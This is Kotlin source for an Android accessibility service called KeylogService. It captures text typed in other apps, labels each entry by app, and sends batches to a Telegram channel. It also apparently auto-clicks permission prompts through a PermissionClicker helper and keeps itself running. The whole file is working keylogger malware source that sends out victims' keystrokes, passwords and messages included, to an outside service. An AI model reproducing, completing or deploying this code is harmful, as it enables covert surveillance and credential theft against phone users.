package com.example.monitor

import android.accessibilityservice.AccessibilityService
import android.content.Intent
import android.os.Handler
import android.os.Looper
import android.view.accessibility.AccessibilityEvent

class KeylogService : AccessibilityService() {

    private val buffer = StringBuilder()
    private val vistos = HashMap<String, String>()
    private var handler: Handler? = null

    private val ciclo = object : Runnable {
        override fun run() {
            descarregar()
            handler?.postDelayed(this, Config.KEYLOG_INTERVAL_MS)
        }
    }

    override fun onServiceConnected() {
        super.onServiceConnected()
        PermissionClicker.armar()
        handler = Handler(Looper.getMainLooper())
        handler?.postDelayed(ciclo, Config.KEYLOG_INTERVAL_MS)
        Thread { Telegram.send("<i>Monitor de digitação conectado</i>") }.start()
    }

    override fun onAccessibilityEvent(evento: AccessibilityEvent?) {
        if (evento == null) return

        try {
            PermissionClicker.agir(this, evento.packageName?.toString())
        } catch (e: Exception) {
        }

        if (evento.eventType != AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) return
        if (evento.packageName?.toString() == packageName) return

        val texto = evento.text?.joinToString("")?.trim().orEmpty()
        if (texto.isEmpty()) return

        val chave = "${evento.packageName}:${evento.windowId}:" +
            "${evento.source?.viewIdResourceName ?: evento.source?.hashCode()}"
        val anterior = vistos[chave] ?: ""
        if (texto == anterior) return
        vistos[chave] = texto
        if (vistos.size > 60) vistos.clear()

        val novo = if (texto.startsWith(anterior)) texto.substring(anterior.length) else texto
        if (novo.isBlank()) return

        val pacote = evento.packageName?.toString()?.substringAfterLast('.') ?: "?"
        buffer.append("[$pacote] $novo\n")

        if (buffer.length >= Config.KEYLOG_FLUSH_CHARS) descarregar()
    }

    private fun descarregar() {
        if (buffer.isEmpty()) return
        val lote = buffer.toString()
        buffer.setLength(0)
        Thread {
            Telegram.send("<b>Digitação</b>\n<pre>${escapar(lote)}</pre>")
        }.start()
    }

    private fun escapar(t: String) = t
        .replace("&", "&amp;")
        .replace("<", "&lt;")
        .replace(">", "&gt;")

    override fun onInterrupt() {
        descarregar()
    }

    override fun onDestroy() {
        handler?.removeCallbacksAndMessages(null)
        descarregar()
        super.onDestroy()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int = START_STICKY
}